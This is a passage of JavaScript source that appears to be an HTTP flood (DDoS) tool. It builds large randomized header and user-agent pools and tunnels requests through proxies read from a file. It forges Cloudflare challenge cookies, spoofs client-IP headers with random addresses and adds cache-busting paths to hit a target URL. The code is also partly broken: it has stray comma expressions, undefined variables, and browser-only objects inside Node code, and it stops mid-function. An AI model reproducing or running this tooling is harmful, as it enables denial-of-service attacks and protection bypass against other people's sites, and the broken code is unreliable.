  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
  "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8" ];

  const lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK',
    'en-GB,en;q=0.8',
    'en-GB,en;q=0.9',
    ' en-GB,en;q=0.7',
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'en-CA,en;q=0.9',
    'en-AU,en;q=0.9',
    'en-NZ,en;q=0.9',
    'en-ZA,en;q=0.9',
    'en-IE,en;q=0.9',
    'en-IN,en;q=0.9',
    'ar-SA,ar;q=0.9',
    'az-Latn-AZ,az;q=0.9',
    'be-BY,be;q=0.9',
    'bg-BG,bg;q=0.9',
    'bn-IN,bn;q=0.9',
    'ca-ES,ca;q=0.9',
    'cs-CZ,cs;q=0.9',
    'cy-GB,cy;q=0.9',
    'da-DK,da;q=0.9',
    'de-DE,de;q=0.9',
    'el-GR,el;q=0.9',
    'es-ES,es;q=0.9',
    'et-EE,et;q=0.9',
    'eu-ES,eu;q=0.9',
    'fa-IR,fa;q=0.9',
    'fi-FI,fi;q=0.9',
    'fr-FR,fr;q=0.9',
    'ga-IE,ga;q=0.9',
    'gl-ES,gl;q=0.9',
    'gu-IN,gu;q=0.9',
    'he-IL,he;q=0.9',
    'hi-IN,hi;q=0.9',
    'hr-HR,hr;q=0.9',
    'hu-HU,hu;q=0.9',
    'hy-AM,hy;q=0.9',
    'id-ID,id;q=0.9',
    'is-IS,is;q=0.9',
    'it-IT,it;q=0.9',
    'ja-JP,ja;q=0.9',
    'ka-GE,ka;q=0.9',
    'kk-KZ,kk;q=0.9',
    'km-KH,km;q=0.9',
    'kn-IN,kn;q=0.9',
    'ko-KR,ko;q=0.9',
    'ky-KG,ky;q=0.9',
    'lo-LA,lo;q=0.9',
    'lt-LT,lt;q=0.9',
    'lv-LV,lv;q=0.9',
    'mk-MK,mk;q=0.9',
    'ml-IN,ml;q=0.9',
    'mn-MN,mn;q=0.9',
    'mr-IN,mr;q=0.9',
    'ms-MY,ms;q=0.9',
    'mt-MT,mt;q=0.9',
    'my-MM,my;q=0.9',
    'nb-NO,nb;q=0.9',
    'ne-NP,ne;q=0.9',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'tt-RU,tt;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
   ];

   const encoding_header = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip", "deflate, gzip", "gzip, identity", '*','*', "*/*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", 'br', "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", 'identity', "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"];

   const control_header = [ 'max-age=604800',
   'proxy-revalidate',
   'public, max-age=0',
   'max-age=315360000',
   'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
   's-maxage=604800',
   'max-stale',
   'public, immutable, max-age=31536000',
   'must-revalidate',
   'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
   'max-age=31536000,public,immutable',
   'max-age=31536000,public',
   'min-fresh',
   'private',
   'public',
   's-maxage',
   'no-cache',
   'no-cache, no-transform',
   'max-age=2592000',
   'no-store',
   'no-transform',
   'max-age=31557600',
   'stale-if-error',
   'only-if-cached',
   'max-age=0',
   'must-understand, no-store',
   'max-age=31536000; includeSubDomains',
   'max-age=31536000; includeSubDomains; preload',
   'max-age=120',
   'max-age=0,no-cache,no-store,must-revalidate',
   'public, max-age=604800, immutable',
   'max-age=0, must-revalidate, private',
   'max-age=0, private, must-revalidate',
   'max-age=604800, stale-while-revalidate=86400',
   'max-stale=3600',
   'public, max-age=2678400',
   'min-fresh=600',
   'public, max-age=30672000',
   'max-age=31536000, immutable',
   'max-age=604800, stale-if-error=86400',
   'public, max-age=604800',
   'no-cache, no-store,private, max-age=0, must-revalidate',
   'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
   'public, s-maxage=600, max-age=60',
   'public, max-age=31536000',
   'max-age=14400, public',
   'max-age=14400',
   'max-age=600, private',
   'public, s-maxage=600, max-age=60',
   'no-store, no-cache, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
   'X-Access-Control: Allow-Origin',
   'Cache-Control: no-cache, no-store, must-revalidate',
   'Authorization: Bearer your_token',
   'Content-Control: no-transform',
   'X-RateLimit-Limit: 1000',
   'Proxy-Connection: keep-alive',
   'X-Frame-Options: SAMEORIGIN',
   'Strict-Transport-Security: max-age=31536000; includeSubDomains',
   'X-Content-Type-Options: nosniff',
   'Retry-After: 120',
   'Connection: close',
   'Accept-Ranges: bytes',
   'ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"',
   'X-DNS-Prefetch-Control: off',
   'Expires: Thu, 01 Jan 1970 00:00:00 GMT',
   'X-Download-Options: noopen',
   'X-Permitted-Cross-Domain-Policies: none',
   'X-Frame-Options: DENY',
   'Expect-CT: max-age=86400, enforce',
   'Upgrade-Insecure-Requests: 1',
   'X-Forwarded-Proto: https',
   'Access-Control-Allow-Origin: *',
   'X-Content-Duration: 3600',
   'Alt-Svc: h3=":443"',
   'X-XSS-Protection: 1; mode=block',
   'Referrer-Policy: no-referrer',
   'X-Pingback: /xmlrpc.php',
   'Content-Encoding: gzip',
   'Age: 3600',
   'X-Clacks-Overhead: GNU Terry Pratchett',
   'Server: Apache/2.4.41 (Unix)',
   'X-Powered-By: PHP/7.4.3',
   'Allow: GET, POST, HEAD',
   'Retry-After: 3600',
   'Access-Control-Allow-Methods: GET, POST, OPTIONS',
   'X-UA-Compatible: IE=edge',
   'Public-Key-Pins: max-age=5184000; pin-sha256="base64+primary=="; pin-sha256="base64+backup=="; includeSubDomains; report-uri="https://example.com/hpkp-report"',
   'Content-Language: en-US',
   'X-Permitted-Cross-Domain-Policies: none',
   'Strict-Transport-Security: max-age=15768000; includeSubDomains',
   'Access-Control-Allow-Headers: Content-Type',
   'X-Frame-Options: ALLOW-FROM https://example.com/',
   'X-Robots-Tag: noindex, nofollow',
   'Access-Control-Max-Age: 3600',
   'X-Cache-Status: MISS',
   'Vary: Accept-Encoding',
   'X-GeoIP-Country-Code: US',
   'X-Do-Not-Track: 1',
   'X-Request-ID: 12345',
   'X-Correlation-ID: abcde',
   'DNT: 1',
   'X-Device-Type: mobile',
   'X-Device-OS: Android',
   'X-Device-Model: Galaxy S10',
   'X-App-Version: 2.1.0',
   'X-User-ID: 123',
   'X-Session-ID: xyz',
   'X-Feature-Flag: new_feature_enabled',
   'X-Experiment-ID: experiment_123',
   'X-Ab-Test: variant_b',
   'X-Tracking-Consent: accepted',
   'X-Customer-Segment: premium',
   'X-User-Role: admin',
   'X-Client-ID: client_567',
   'X-Internal-Request: true',
   'X-Service-Name: backend-api',
   'X-Backend-Server: server-1',
   'X-Database-Query: SELECT * FROM users',
   'X-Cache-Control: no-store',
   'X-Environment: production',
   'X-Debug-Mode: false',
   'X-Remote-IP: 203.0.113.195',
   'X-Proxy: true',
   'X-Origin: https://www.example.com',
   'X-FastCGI-Cache: HIT',
   'X-Pagination-Total: 1000',
   'X-Pagination-Page: 5',
   'X-Pagination-Limit: 20',
   'X-Notification-Count: 3',
   'X-Message-ID: msg_123',
   'X-Notification-Type: alert',
   'X-Notification-Priority: high',
   'X-Queue-Depth: 50',
   'X-Queue-Position: 10',
   'X-Queue-Status: active',
   'X-Content-Hash: sha256=abcdef123456',
   'X-Resource-ID: resource_789',
   'X-Resource-Type: article',
   'X-Transaction-ID: tx_456',
   'X-Transaction-Status: success',
   'X-Transaction-Amount: $100.00',
   'X-Transaction-Currency: USD',
   'X-Transaction-Date: 2024-01-24T12:00:00Z',
   'X-Payment-Method: credit_card',
   'X-Payment-Status: authorized',
   'X-Shipping-Method: express',
   'X-Shipping-Cost: $10.00',
   'X-Subscription-Status: active',
   'X-Subscription-Type: premium',
   'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64'];

  const userAgents = [ 
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 GTmetrix",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 GTmetrix",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 GTmetrix",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 GTmetrix",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36 GTmetrix",
    "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:54.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Linux; Android 4.3; Galaxy Nexus Build/JWR66Y; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:53.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:49.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Linux; Android 4.3; Galaxy Nexus Build/JWR66Y; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.68 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:47.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.1.2; Galaxy Nexus Build/JZO54K; GTmetrix https://gtmetrix.com/) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.22",
    "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:39.0; GTmetrix http://gtmetrix.com/) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Linux; Android 4.1.2; Galaxy Nexus Build/JZO54K; GTmetrix http://gtmetrix.com/) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.22",
    "Mozilla/5.0 (X11; Linux x86_64; rv:43.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/43.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:41.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/41.0",
    
];
const Methods = {
    GET: 10,
    POST: 8,
    HEAD: 5,
    PUT: 2,
    DELETE: 2,
    OPTIONS: 1,
    CONNECT: 0.5,
    TRACE: 0.5,
    PATCH: 0.5,
    PURGE: 0.3,
    LINK: 0.2,
    UNLINK: 0.2,
};

const browserPatterns = {
    chrome: {
        methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'PATCH'],
        weight: 6
    },
    firefox: {
        methods: ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE'],
        weight: 3
    },
    safari: {
        methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'],
        weight: 2
    },
    edge: {
        methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'],
        weight: 2
    },
    opera: {
        methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'],
        weight: 1
    },
    internetExplorer: {
        methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'],
        weight: 1
    },
    brave: {
        methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'],
        weight: 1
    },
    torBrowser: {
        methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'],
        weight: 1
    }
};

const weightedMethods = Object.entries(Methods)
  .flatMap(([method, weight]) => Array(Math.ceil(weight)).fill(method));

const browserWeights = Object.values(browserPatterns).map(b => b.weight);
const totalBrowserWeight = browserWeights.reduce((a, b) => a + b, 0);

function getSecureRandom(max) {
  try {
      const randomArray = new Uint32Array(1);
      return crypto.getRandomValues(randomArray)[0] % max;
  } catch {
      return Math.floor(Math.random() * max);
  }
}

function selectMethodStrategy() {
  const strategyChoice = getSecureRandom(100);
  
  if (strategyChoice < 70) {
      const method = weightedMethods[getSecureRandom(weightedMethods.length)];
      return { method, source: 'weighted' };
  } else {
      let cumulative = 0;
      const target = getSecureRandom(totalBrowserWeight);
      
      for (const [browser, data] of Object.entries(browserPatterns)) {
          cumulative += data.weight;
          if (target < cumulative) {
              const methods = data.methods.filter(m => Methods[m]);
              const selected = methods[getSecureRandom(methods.length)] || 'GET';
              return { method: selected, source: `browser:${browser}` };
          }
      }
      return { method: 'GET', source: 'fallback' };
  }
}

try {
  const { method, source } = selectMethodStrategy();
  headers[":method"] = Methods.hasOwnProperty(method) ? method : 'GET';
  headers["x-method-source"] = source;
  
  if (source.startsWith('browser')) {
      headers["user-agent"] = generateBrowserUA(source.split(':')[1]);
  }
  
} catch (error) {
  console.error("Method selection failed:", error);
  headers[":method"] = "GET";
  headers["x-method-source"] = "error-fallback";
}

  const useragentl = [
    '(CheckSecurity 2_0)',
    '(BraveBrowser 5_0)',
    '(ChromeBrowser 3_0)',
    '(ChromiumBrowser 4_0)',
    '(AtakeBrowser 2_0)',
    '(NasaChecker)',
    '(CloudFlareIUAM)',
    '(NginxChecker)',
    '(AAPanel)',
    '(AntiLua)',
    '(FushLua)',
    '(FBIScan)',
    '(FirefoxTop)',
    '(ChinaNet Bot)',
    '(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36)',
    '(Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0)', 
    '(Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36)', 
    '(Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1)', 
    '(Googlebot/2.1; +http://www.google.com/bot.html)', 
    '(Bingbot/2.0; +http://www.bing.com/bingbot.htm)', 
    '(YandexBot/3.0; +http://yandex.com/bots)', 
    '(DuckDuckBot/1.0; +https://duckduckgo.com/duckduckbot)', 
    '(Scrapy/2.4.0; +https://scrapy.org)',
    '(Wget/1.21.1)', 
    '(curl/7.68.0)', 
    '(Python-requests/2.25.1)', 
    '(Apache-HttpClient/4.5.13)', 
    '(PostmanRuntime/7.28.0)', 
    '(Insomnia/2021.5.2)', 
    '(Java/11.0.10)',
    '(Go-http-client/1.1)', 
    '(HttpClient/4.5)', 
    '(HTTrack 3.49; Windows)', 
    '(WebScraperBot/1.0; +https://webscraper.io/bot)', 
  ];
 
const mozilla = [
  'Mozilla/4.0 ',
  'Mozilla/5.0 ',
  'Mozilla/6.0 ',
  'Mozilla/7.0 ',
  'Mozilla/8.0 ',
  'Mozilla/9.0 '
 ];

function generateRandomString(length, chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') {
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

const randomComponents = {
  cfHash: () => generateRandomString(43, 'abcdef0123456789'),
  cfTimestamp: () => Math.floor(Date.now() / 1000).toString(),
  cfVersion: () => `${generateRandomString(1, '123456789')}.0.0.${Math.floor(Math.random() * 9) + 1}`,
  cfSegment: (length) => generateRandomString(length),
};

const cookies = {
  cf_clearance: `${generateRandomString(32, 'abcdef0123456789')}.${randomComponents.cfTimestamp()}-` +
                `${randomComponents.cfSegment(8)}-${randomComponents.cfVersion()}-` +
                `${randomComponents.cfSegment(11)}_${Math.random() > 0.5 ? 'vs' : 'nv'}_V.` +
                `${randomComponents.cfSegment(21)}_${randomComponents.cfSegment(47)}`,

  cf_chl_tk: `${randomComponents.cfHash()}-${randomComponents.cfTimestamp().slice(-10)}-` +
             `${randomComponents.cfVersion()}${generateRandomString(4, '0123456789')}`,

  cf_chl_rc_md5: generateRandomString(32, 'abcdef0123456789')
};


var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = userAgents[Math.floor(Math.floor(Math.random() * userAgents.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
 
class NetSocket {
  constructor() {}

  async HTTP(options, callback) {
    if (typeof options!== 'object' || options === null || typeof callback!== 'function') {
      return callback(undefined, 'error: invalid arguments');
    }

    const { address, host, port, timeout } = options;

    if (!address ||!host ||!port || timeout <= 0) {
      return callback(undefined, 'error: missing or invalid options');
    }

    const parsedAddr = address.split(":");
    if (parsedAddr.length!== 2) {
      return callback(undefined, 'error: invalid address format');
    }

    const addrHost = parsedAddr[0];
    const addrPort = parseInt(parsedAddr[1], 10);

    const payload = `CONNECT ${address}:${addrPort} HTTP/1.1\r\nHost: ${address}:${addrPort}\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(payload);

    return new Promise((resolve, reject) => {
      const connection = net.connect({
        host,
        port,
      });

      connection.setTimeout(timeout * 1000);
      connection.setKeepAlive(true, 100000);

      connection.on('connect', () => {
        connection.write(buffer);
      });

      connection.on('data', (chunk) => {
        const response = chunk.toString('utf-8');
        if (!response.includes('HTTP/1.1 200')) {
          connection.destroy();
          reject(new Error('error: invalid response from proxy server'));
        } else {
          resolve(connection);
        }
      });

      connection.on('timeout', () => {
        connection.destroy();
        reject(new Error('error: timeout exceeded'));
      });

      connection.on('error', (error) => {
        connection.destroy();
        reject(error);
      });
    }).then(connection => callback(connection, undefined)).catch(error => callback(undefined, error.message));
  }
}

const Socker = new NetSocket();
const browserProfile = generateBrowserProfile();

Object.assign(headers, {
    ":method": browserProfile.method,
    ":authority": parsedTarget.host,
    ":path": generateDynamicPath(parsedTarget),
    ":scheme": "https"
});

Object.assign(headers, {
    "user-agent": browserProfile.ua, uap1,
    "x-forwarded-proto": "https",
    "cache-control": generateCacheControl(browserProfile), control,
    "accept-language": generateAcceptLanguage(), lang,
    "accept-encoding": generateAcceptEncoding(), encoding,
    "accept": generateAcceptHeader(), accept,
});

Object.assign(headers, {
    "sec-ch-ua": browserProfile.secCHUA,
    "sec-ch-ua-mobile": browserProfile.mobile ? "?1" : "?0",
    "sec-ch-ua-platform": browserProfile.platform,
    "sec-fetch-mode": browserProfile.navigationMode,
    "sec-fetch-dest": "document",
    "sec-fetch-site": browserProfile.siteContext,
    "sec-fetch-user": "?1"
});

const ipChain = generateIPChain();
Object.assign(headers, {
    "x-forwarded-for": ipChain,
    "forwarded": generateForwardedHeader(ipChain),
    "true-client-ip": selectIPFromChain(ipChain),
    "x-real-ip": selectIPFromChain(ipChain), spoofed,
    "cf-connecting-ip": selectIPFromChain(ipChain)
});

Object.assign(headers, {
    "cookie": formatCookies(cookies) + `; cf_clearance=${cookies.cf_clearance}` + `; __cf_chl_tk=${cookies.cf_chl_tk}` + `; __cf_chl_rc_md5=${cookies.cf_chl_rc_md5}`,
    "referer": generateContextualReferrer(browserProfile),
    "referrer-policy": generateReferrerPolicy(),
    "priority": generatePriorityHint(),
    "content-security-policy": generateDynamicCSP(),
    "permissions-policy": generatePermissionsPolicy()
});

Object.assign(headers, {
    "server-timing": generateServerTiming(),
    "via": generateCDNChain(),
    "x-edge": generateCDNIdentifier()
});

Object.assign(headers, {
    "upgrade-insecure-requests": browserProfile.upgradeInsecure,
    "x-http2-stream-id": generateStreamID(),
    "grpc-timeout": generateGRPCTimeout()
});

function generateQueryString(params) {
  const searchParams = new URLSearchParams();
  for (const [key, value] of params) {
      if (key && value) {
          searchParams.set(key, encodeURIComponent(value));
      }
  }
  return searchParams.toString();
}

function generateDynamicPath(parsedTarget) {
  const pathSegments = [
      parsedTarget.path,
      randomArrayElement(pathts),
      `_=${Date.now()}`,
      `cache=${Math.random().toString(36).substr(2, 8)}`
  ];
  
  const queryParams = [];
  if (params) {
      queryParams.push(...params);
  }
  
  return `${pathSegments.join('/')}?${generateQueryString(queryParams)}`;
}


function generateIPChain() {
    const hops = Array.from({length: 3}, () => generateRandomIP());
    return [...hops, generateRandomIP()].join(', ');
}

function generateRandomIP() {
    return Array.from({length: 4}, () => Math.floor(Math.random() * 256)).join('.');
}

function generateBrowserProfile() {
    const envFactors = {
        screenRatio: window.screen.width / window.screen.height,
        perfMark: performance.now() % 1000,
        tzOffset: new Date().getTimezoneOffset()
    };
    
    return {
        method: selectMethodStrategy(envFactors),
        ua: generateBrowserUA(envFactors),
        secCHUA: generateSecCHUA(),
        platform: generatePlatformString(envFactors),
        mobile: detectMobileContext(),
        navigationMode: calculateNavigationMode(),
        siteContext: generateSiteContext(),
        upgradeInsecure: Math.random() > 0.65
    };
}

function generatePlatformString(env) {
    const platformType = env.platformType || 'desktop'; 
    const platformDetails = {
        desktop: `Windows NT 10.0; Win64; x64`,
        mobile: `Mobile; ${browserProfile.ua}`,
        tablet: `Tablet; ${browserProfile.ua}`,
        unknown: 'Unknown Platform'
    };

    // Return the appropriate platform string based on the platformType
    return platformDetails[platformType] || platformDetails.unknown;
}

function generateBrowserUA(env) {
    const versionSalt = env.perfMark % 100;
    const platforms = {
        chrome: `Chrome/${100 + (versionSalt % 15)}.0.${Math.floor(versionSalt/15)}.0`,
        firefox: `Firefox/${90 + (versionSalt % 30)}.0`,
        safari: `Version/${15 + (versionSalt % 5)}.0.3`
    };
    return `Mozilla/5.0 (${generateOSString(env)}) AppleWebKit/537.36 (KHTML, like Gecko) ${platforms.chrome} Safari/537.36`;
}
function generateOSString(env) {
    // Assuming env contains relevant OS information
    const osType = env.osType || 'Windows';
    const osVersion = env.osVersion || '10.0';

    // Define different OS strings based on the type
    const osStrings = {
        Windows: `Windows NT ${osVersion}; Win64; x64`,
        Mac: `Macintosh; Intel Mac OS X 10_${osVersion}`,
        Linux: `X11; Linux x86_64`,
        Android: `Android ${osVersion}; Mobile;`
    };

    // Return the appropriate OS string or a default if the type is unknown
    return osStrings[osType] || `Unknown OS`;
}

function generateSecCHUA() {
    const brands = [
        {name: "Chromium", version: "116"}, 
        {name: "Not)A;Brand", version: "24"}, 
        {name: "Google Chrome", version: "121"}
    ];
    return brands.map(b => `"${b.name}";v="${b.version}"`).join(', ');
}

// Additional Core Implementations
function generateCacheControl() {
    const directives = [
        'public',
        'private',
        'no-cache',
        'max-age=' + Math.floor(Math.random() * 3600),
